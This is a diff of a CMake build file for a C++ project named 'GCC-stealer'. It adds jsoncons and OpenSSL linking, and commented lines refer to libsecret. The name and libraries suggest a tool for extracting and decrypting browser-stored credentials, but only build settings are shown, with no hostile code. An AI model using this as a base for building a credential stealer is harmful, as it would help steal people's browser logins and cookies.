@@ -6,13 +6,12 @@ if (!CMAKE_TOOLCHAIN_FILE)
 endif()
 
 find_package(unofficial-sqlite3 CONFIG REQUIRED)
-
-if(NOT ${CMAKE_SYSTEM_NAME} MATCHES "Windows")
-    find_package(OpenSSL REQUIRED)
-endif()
+find_package(jsoncons CONFIG REQUIRED)
+find_package(OpenSSL REQUIRED)
 
 set(GCC-stealer_SOURCE_FILES
     src/GCC-stealer.cpp
+    src/base64.hpp
 )
 
 set(BUILD_SHARED_LIBS OFF)
@@ -28,7 +27,8 @@ endif()
 
 target_compile_features(GCC-stealer PRIVATE cxx_std_17)
 
-target_link_libraries(GCC-stealer PRIVATE unofficial::sqlite3::sqlite3)
+target_link_libraries(GCC-stealer PRIVATE unofficial::sqlite3::sqlite3 jsoncons)
+target_link_libraries(GCC-stealer PRIVATE OpenSSL::SSL OpenSSL::Crypto)
 
 if(${CMAKE_SYSTEM_NAME} MATCHES "Windows")
     set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
@@ -47,7 +47,7 @@ elseif(${CMAKE_SYSTEM_NAME} MATCHES "Linux")
     target_include_directories(GCC-stealer PRIVATE "${VCPKG_LIBS_PATH}/glib-2.0/include")
 
     #message(STATUS ${LIBSECRET_LIBRARIES})
-    target_link_libraries(GCC-stealer PRIVATE OpenSSL::SSL OpenSSL::Crypto)
+    
     #target_link_libraries(GCC-stealer PRIVATE PkgConfig::Libsecret)
 
     target_link_directories(GCC-stealer PRIVATE ${VCPKG_LIBS_PATH})
